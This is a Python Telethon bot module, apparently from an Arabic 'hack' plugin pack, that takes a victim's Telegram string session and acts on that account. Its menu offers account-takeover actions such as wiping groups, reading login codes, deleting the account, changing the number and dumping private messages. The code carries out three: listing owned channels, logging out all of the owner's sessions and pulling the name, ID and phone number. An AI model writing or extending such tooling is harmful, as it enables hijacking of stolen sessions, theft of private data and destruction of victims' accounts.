# -*- coding: utf-8 -*-
# موديول الهـاك المطور - متوافق مع سورس عبود V11.0
# يتم وضعه داخل مجلد assistant ليعمل عبر توكن البوت

from telethon import events, functions, types, Button
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import asyncio
import re

# المتغيرات API_ID و tgbot يتم حقنها تلقائياً من main.py

MENU_TEXT = '''
**╭─━━━━━━━━━━━━━─╮**
** 🔰 ABOOD-HACK 🔰**
**╰─━━━━━━━━━━━━━─╯**

**🅐** :~ [معرفه قنوات/كروبات التي يملكها]
**🅑** :~ [جلب جميع معلومات المستخدم]
**🅒** :~ [تفليش كروب/قناه]
**🅓** :~ [جلب اخر رسائل تسجيل الدخول]
**🅔** :~ [انضمام الى كروب/قناه]
**🅕** :~ [مغادره كروب /قناه]
**🅖** :~ [مسح كروب /قناه]
**🅗** :~ [فحص التحقق بخطوتين]
**🅘** :~ [انهاء جميع الجلسات]
**🅙** :~ [حذف الحساب]
**🅚** :~ [حذف جميع المشرفين]
**🅛** :~ [ترقيه عضو الى مشرف]
**🅜** :~ [تغير رقم الحساب]
**🅝** :~ [الأذاعة الشاملةة]
**🅞** :~ [جلب الرسائل المحفوظة]
**🅟** :~ [جلب رسائل مستخدم معين]
**🅠** :~ [تغيير البايو]
'''

KEYBOARD = [
    [Button.inline("🅐", data="hack_a"), Button.inline("🅑", data="hack_b"), Button.inline("🅒", data="hack_c"), Button.inline("🅓", data="hack_d"), Button.inline("🅔", data="hack_e")],
    [Button.inline("🅕", data="hack_f"), Button.inline("🅖", data="hack_g"), Button.inline("🅗", data="hack_h"), Button.inline("🅘", data="hack_i"), Button.inline("🅙", data="hack_j")],
    [Button.inline("🅚", data="hack_k"), Button.inline("🅛", data="hack_l"), Button.inline("🅜", data="hack_m"), Button.inline("🅝", data="hack_n"), Button.inline("🅞", data="hack_o")],
    [Button.inline("🅟", data="hack_p"), Button.inline("🅠", data="hack_q")],
    [Button.url("• المـطور •", "https://t.me/Lx5x5")]
]

@tgbot.on(events.NewMessage(pattern="/hack", func=lambda e: e.is_private))
async def hack_start(event):
    await event.reply(MENU_TEXT, buttons=KEYBOARD)

@tgbot.on(events.CallbackQuery(data=re.compile(b"hack_(.*)")))
async def callback_handler(event):
    cmd = event.data_match.group(1).decode("utf-8")
    async with tgbot.conversation(event.chat_id) as conv:
        await conv.send_message("**⚠️ أرسل الآن كود الجلسة (String Session):**")
        res = await conv.get_response()
        session_str = res.text.strip()
        
        # استخدام API_ID من الملف الرئيسي
        from __main__ import API_ID, API_HASH
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        
        try:
            await client.connect()
            if not await client.is_user_authorized():
                return await event.respond("❌ الجلسة منتهية.")
            me = await client.get_me()
            
            if cmd == "a":
                chans = await client(functions.channels.GetAdminedPublicChannelsRequest())
                t = "\n".join([f"- {c.title} (@{c.username})" for c in chans.chats])
                await event.respond(f"**قنواته:**\n{t or 'لا يوجد'}")
            elif cmd == "i":
                await client(functions.auth.ResetAuthorizationsRequest())
                await event.respond("✅ تم إنهاء الجلسات.")
            elif cmd == "b":
                await event.respond(f"**الاسم:** {me.first_name}\n**ID:** `{me.id}`\n**رقم:** `{me.phone}`")
            # يمكنك إضافة بقية الأوامر هنا بنفس النمط
            
            await client.disconnect()
        except Exception as e:
            await event.respond(f"❌ خطأ: {e}")
